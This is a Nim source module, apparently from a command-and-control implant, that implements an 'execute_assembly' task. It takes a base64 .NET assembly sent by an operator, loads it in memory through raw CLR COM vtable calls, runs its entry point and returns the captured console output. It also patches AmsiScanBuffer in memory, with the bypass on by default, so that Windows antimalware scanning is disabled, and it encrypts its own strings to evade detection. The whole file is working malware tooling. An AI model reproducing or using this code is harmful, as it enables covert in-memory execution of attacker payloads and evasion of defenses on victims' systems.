## execute_assembly -- CLR hosting via ICLRMetaHost (Windows x64).
## Charge et execute un assembly .NET managee en memoire dans le processus courant.
## La sortie console est capturee via redirection pipe avant Start().

import std/[json, strutils, base64]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE  = int
    DWORD   = uint32
    SIZE_T  = uint
    BOOL    = int32
    LPVOID  = pointer
    WCHAR   = uint16
    HRESULT = int32

  const
    S_OK              = HRESULT(0)
    PAGE_EXECUTE_READWRITE = DWORD(0x40)

  # Pipe + stdio
  type SECURITY_ATTRIBUTES = object
    nLength: DWORD
    lpSecurityDescriptor: LPVOID
    bInheritHandle: BOOL

  proc CreatePipe(hRd: ptr HANDLE, hWr: ptr HANDLE,
                  sa: ptr SECURITY_ATTRIBUTES, sz: DWORD): BOOL
    {.importc: "CreatePipe", dynlib: "kernel32".}
  proc SetStdHandle(nHandle: DWORD, hHandle: HANDLE): BOOL
    {.importc: "SetStdHandle", dynlib: "kernel32".}
  proc GetStdHandle(nHandle: DWORD): HANDLE
    {.importc: "GetStdHandle", dynlib: "kernel32".}
  proc ReadFile(h: HANDLE, buf: pointer, nToRead: DWORD,
                nRead: ptr DWORD, ov: pointer): BOOL
    {.importc: "ReadFile", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc GetCurrentProcess(): HANDLE
    {.importc: "GetCurrentProcess", dynlib: "kernel32".}
  proc VirtualProtect(a: LPVOID, sz: SIZE_T, p: DWORD, op: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  # AMSI patch (optional, inline)
  proc LoadLibraryA(n: cstring): HANDLE
    {.importc: "LoadLibraryA", dynlib: "kernel32".}
  proc GetProcAddress(h: HANDLE, n: cstring): LPVOID
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc GetModuleHandleA(n: cstring): HANDLE
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}

  # SAFEARRAY (oleaut32)
  type SAFEARRAYBOUND = object
    cElements: uint32
    lLbound: int32

  type SAFEARRAY = object
    cDims:     uint16
    fFeatures: uint16
    cbElements: uint32
    cLocks:    uint32
    pvData:    LPVOID
    rgsabound: array[1, SAFEARRAYBOUND]

  proc SafeArrayCreateVector(vt: uint16, lb: int32, cnt: uint32): ptr SAFEARRAY
    {.importc: "SafeArrayCreateVector", dynlib: "oleaut32".}
  proc SafeArrayAccessData(psa: ptr SAFEARRAY, ppv: ptr LPVOID): HRESULT
    {.importc: "SafeArrayAccessData", dynlib: "oleaut32".}
  proc SafeArrayUnaccessData(psa: ptr SAFEARRAY): HRESULT
    {.importc: "SafeArrayUnaccessData", dynlib: "oleaut32".}
  proc SafeArrayDestroy(psa: ptr SAFEARRAY): HRESULT
    {.importc: "SafeArrayDestroy", dynlib: "oleaut32".}
  proc SysAllocStringLen(src: ptr WCHAR, len: uint32): pointer
    {.importc: "SysAllocStringLen", dynlib: "oleaut32".}
  proc SysFreeString(bstr: pointer)
    {.importc: "SysFreeString", dynlib: "oleaut32".}

  # GUID
  type GUID = object
    d1: uint32
    d2: uint16
    d3: uint16
    d4: array[8, uint8]

  # VARIANT (16 bytes on x64)
  type VARIANT = object
    vt:  uint16
    r1, r2, r3: uint16
    data: array[8, byte]

  const
    VT_EMPTY: uint16 = 0
    VT_BSTR:  uint16 = 8
    VT_ARRAY: uint16 = 0x2000
    VT_UI1:   uint16 = 17
    STD_OUTPUT_HANDLE = DWORD(0xFFFFFFF5'u32)

  # vtable helper: get pointer at vtable slot i of COM object
  proc vtSlot(obj: pointer, i: int): pointer =
    cast[ptr UncheckedArray[pointer]](cast[ptr pointer](obj)[])[i]

  # GUIDs
  let CLSID_CLRMetaHost = GUID(d1: 0x9280188D'u32, d2: 0x0E8E'u16, d3: 0x4867'u16,
    d4: [0xB3'u8, 0x0C'u8, 0x7F'u8, 0xA8'u8, 0x38'u8, 0x84'u8, 0xE8'u8, 0xDE'u8])
  let IID_ICLRMetaHost = GUID(d1: 0xD332DB9E'u32, d2: 0xB9B3'u16, d3: 0x4125'u16,
    d4: [0x82'u8, 0x07'u8, 0xA1'u8, 0x48'u8, 0x84'u8, 0xF5'u8, 0x32'u8, 0x16'u8])
  let IID_ICLRRuntimeInfo = GUID(d1: 0xBD39D1D2'u32, d2: 0xBA2F'u16, d3: 0x486A'u16,
    d4: [0x89'u8, 0xB0'u8, 0xB4'u8, 0xB0'u8, 0xCB'u8, 0x46'u8, 0x68'u8, 0x91'u8])
  let CLSID_CorRuntimeHost = GUID(d1: 0xCB2F6723'u32, d2: 0xAB3A'u16, d3: 0x11D2'u16,
    d4: [0x9C'u8, 0x40'u8, 0x00'u8, 0xC0'u8, 0x4F'u8, 0xA3'u8, 0x0A'u8, 0x3E'u8])
  let IID_ICorRuntimeHost = GUID(d1: 0xCB2F6722'u32, d2: 0xAB3A'u16, d3: 0x11D2'u16,
    d4: [0x9C'u8, 0x40'u8, 0x00'u8, 0xC0'u8, 0x4F'u8, 0xA3'u8, 0x0A'u8, 0x3E'u8])
  let IID_AppDomain = GUID(d1: 0x05F696DC'u32, d2: 0x2B29'u16, d3: 0x3663'u16,
    d4: [0xAD'u8, 0x8B'u8, 0xC4'u8, 0x38'u8, 0x9C'u8, 0xF2'u8, 0xA7'u8, 0x13'u8])

  proc CLRCreateInstance(clsid: ptr GUID, riid: ptr GUID, ppIface: ptr pointer): HRESULT
    {.importc: "CLRCreateInstance", dynlib: "mscoree".}

  proc toWide(s: string): seq[WCHAR] =
    result = newSeq[WCHAR](s.len + 1)
    for i, c in s: result[i] = WCHAR(c)
    result[s.len] = 0

  proc patchAmsiInline() =
    let h = LoadLibraryA("amsi.dll")
    if h == 0: return
    let p = cast[LPVOID](GetProcAddress(h, "AmsiScanBuffer"))
    if p == nil: return
    var patch: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]
    var old: DWORD
    if VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, addr old) != 0:
      copyMem(p, addr patch[0], 3)
      discard VirtualProtect(p, 3, old, addr old)

  proc variantSetSafeArray(v: var VARIANT, elemVt: uint16, psa: ptr SAFEARRAY) =
    v.vt = VT_ARRAY or elemVt
    cast[ptr pointer](addr v.data[0])[] = psa

  proc makeStringArray(args: seq[string]): ptr SAFEARRAY =
    let psa = SafeArrayCreateVector(VT_BSTR, 0, uint32(args.len))
    if psa == nil: return nil
    var pData: LPVOID = nil
    if SafeArrayAccessData(psa, addr pData) != S_OK: return nil
    let slots = cast[ptr UncheckedArray[pointer]](pData)
    for i, a in args:
      var wide = toWide(a)
      slots[i] = SysAllocStringLen(addr wide[0], uint32(a.len))
    discard SafeArrayUnaccessData(psa)
    return psa

  proc executeAssembly(asmBytes: seq[byte], args: seq[string],
                       amsiBypass: bool): string =
    if amsiBypass: patchAmsiInline()

    # Redirect stdout to pipe before CLR Start() so Console.Out uses our pipe
    var hRead, hWrite: HANDLE
    var sa: SECURITY_ATTRIBUTES
    sa.nLength = DWORD(sizeof(sa))
    sa.bInheritHandle = 1
    if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
      return hidstr("Error: CreatePipe failed")

    let oldStdout = GetStdHandle(STD_OUTPUT_HANDLE)
    discard SetStdHandle(STD_OUTPUT_HANDLE, hWrite)

    var pMetaHost: pointer = nil
    var clsidMH = CLSID_CLRMetaHost
    var iidMH   = IID_ICLRMetaHost
    var hr = CLRCreateInstance(addr clsidMH, addr iidMH, addr pMetaHost)
    if hr != S_OK or pMetaHost == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: CLRCreateInstance failed (0x") & $hr.uint32.toHex(8) & ")"

    # ICLRMetaHost::GetRuntime (vtable index 3)
    var pRTInfo: pointer = nil
    var ver = toWide("v4.0.30319")
    var iidRI = IID_ICLRRuntimeInfo
    type FnGetRuntime = proc(self: pointer, ver: ptr WCHAR, riid: ptr GUID,
                             pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnGetRuntime](vtSlot(pMetaHost, 3))(pMetaHost, addr ver[0], addr iidRI, addr pRTInfo)
    if hr != S_OK or pRTInfo == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: GetRuntime failed (0x") & $hr.uint32.toHex(8) & ")"

    # ICLRRuntimeInfo::GetInterface (vtable index 9)
    var pHost: pointer = nil
    var clsidCRH = CLSID_CorRuntimeHost
    var iidCRH   = IID_ICorRuntimeHost
    type FnGetInterface = proc(self: pointer, clsid: ptr GUID, riid: ptr GUID,
                               pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnGetInterface](vtSlot(pRTInfo, 9))(pRTInfo, addr clsidCRH, addr iidCRH, addr pHost)
    if hr != S_OK or pHost == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: GetInterface(CorRuntimeHost) failed")

    # ICorRuntimeHost::Start (vtable index 10)
    type FnVoid = proc(self: pointer): HRESULT {.stdcall.}
    hr = cast[FnVoid](vtSlot(pHost, 10))(pHost)
    if hr != S_OK:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: ICorRuntimeHost::Start failed")

    # ICorRuntimeHost::GetDefaultDomain (vtable index 13)
    var pDomUnk: pointer = nil
    type FnGetDomain = proc(self: pointer, pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnGetDomain](vtSlot(pHost, 13))(pHost, addr pDomUnk)
    if hr != S_OK or pDomUnk == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: GetDefaultDomain failed")

    # QI pDomUnk for _AppDomain (IID_AppDomain)
    var pDomain: pointer = nil
    var iidAD = IID_AppDomain
    type FnQI = proc(self: pointer, riid: ptr GUID, pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnQI](vtSlot(pDomUnk, 0))(pDomUnk, addr iidAD, addr pDomain)
    if hr != S_OK or pDomain == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: QI _AppDomain failed")

    # _AppDomain::Load_3 (vtable index 43) - load from SAFEARRAY of bytes
    let pAsmSA = SafeArrayCreateVector(VT_UI1, 0, uint32(asmBytes.len))
    if pAsmSA == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: SafeArrayCreateVector failed")
    var pRaw: LPVOID = nil
    discard SafeArrayAccessData(pAsmSA, addr pRaw)
    copyMem(pRaw, unsafeAddr asmBytes[0], asmBytes.len)
    discard SafeArrayUnaccessData(pAsmSA)

    var pAssembly: pointer = nil
    type FnLoad3 = proc(self: pointer, raw: ptr SAFEARRAY,
                        pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnLoad3](vtSlot(pDomain, 43))(pDomain, pAsmSA, addr pAssembly)
    discard SafeArrayDestroy(pAsmSA)
    if hr != S_OK or pAssembly == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: _AppDomain::Load_3 failed (0x") & $hr.uint32.toHex(8) & ")"

    # _Assembly::get_EntryPoint (vtable index 16)
    var pMethodInfo: pointer = nil
    type FnGetEP = proc(self: pointer, pp: ptr pointer): HRESULT {.stdcall.}
    hr = cast[FnGetEP](vtSlot(pAssembly, 16))(pAssembly, addr pMethodInfo)
    if hr != S_OK or pMethodInfo == nil:
      discard CloseHandle(hWrite); discard CloseHandle(hRead)
      discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      return hidstr("Error: get_EntryPoint failed")

    # Build SAFEARRAY of string args for Main(string[])
    let pArgsSA = makeStringArray(args)

    # Wrap in VARIANT for the parameters SAFEARRAY
    var parms: ptr SAFEARRAY = nil
    var argVariant: VARIANT
    if pArgsSA != nil:
      variantSetSafeArray(argVariant, VT_BSTR, pArgsSA)
      parms = SafeArrayCreateVector(uint16(12), 0, 1)  # VT_VARIANT=12
      var pParmsData: LPVOID = nil
      discard SafeArrayAccessData(parms, addr pParmsData)
      copyMem(pParmsData, addr argVariant, sizeof(VARIANT))
      discard SafeArrayUnaccessData(parms)

    # _MethodInfo::Invoke_3 (vtable index 37)
    var objVariant: VARIANT  # VT_EMPTY = invoke static method
    var retVariant: VARIANT
    type FnInvoke3 = proc(self: pointer, obj: VARIANT, parms: ptr SAFEARRAY,
                          ret: ptr VARIANT): HRESULT {.stdcall.}
    hr = cast[FnInvoke3](vtSlot(pMethodInfo, 37))(pMethodInfo, objVariant, parms, addr retVariant)

    if parms != nil: discard SafeArrayDestroy(parms)
    if pArgsSA != nil: discard SafeArrayDestroy(pArgsSA)

    # Restore stdout and read captured output
    discard CloseHandle(hWrite)
    discard SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)

    var output = ""
    var buf: array[4096, byte]
    var nRead: DWORD = 0
    while ReadFile(hRead, addr buf[0], DWORD(sizeof(buf)), addr nRead, nil) != 0 and nRead > 0:
      let chunk = newString(int(nRead))
      copyMem(unsafeAddr chunk[0], addr buf[0], int(nRead))
      output.add(chunk)
    discard CloseHandle(hRead)

    if hr != S_OK:
      let errMsg = hidstr("Assembly threw exception or invocation failed (HRESULT 0x") &
                   $hr.uint32.toHex(8) & ")"
      if output.len > 0: return output & "\n" & errMsg
      return errMsg

    if output.len == 0: output = hidstr("[execute_assembly] No console output captured.")
    return output

proc executeAssemblyExecute(taskId: string, params: JsonNode,
                              state: AgentState, send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("execute_assembly: Windows only"),
                      status: "error", completed: true)
  else:
    let asmB64 = params{"asm_b64"}.getStr("")
    if asmB64.len == 0:
      return TaskResult(output: hidstr("Error: asm_b64 missing"),
                        status: "error", completed: true)

    let asmBytes  = cast[seq[byte]](decode(asmB64))
    let argsStr   = params{"args"}.getStr("")
    let doAmsi    = params{"amsi_bypass"}.getBool(true)

    var argsList: seq[string] = @[]
    if argsStr.len > 0:
      argsList = argsStr.splitWhitespace()

    let output = executeAssembly(asmBytes, argsList, doAmsi)
    let stat   = if output.startsWith("Error"): "error" else: "success"
    return TaskResult(output: output, status: stat, completed: true)

proc initExecuteAssembly*() =
  register(hidstr("execute_assembly"), executeAssemblyExecute)
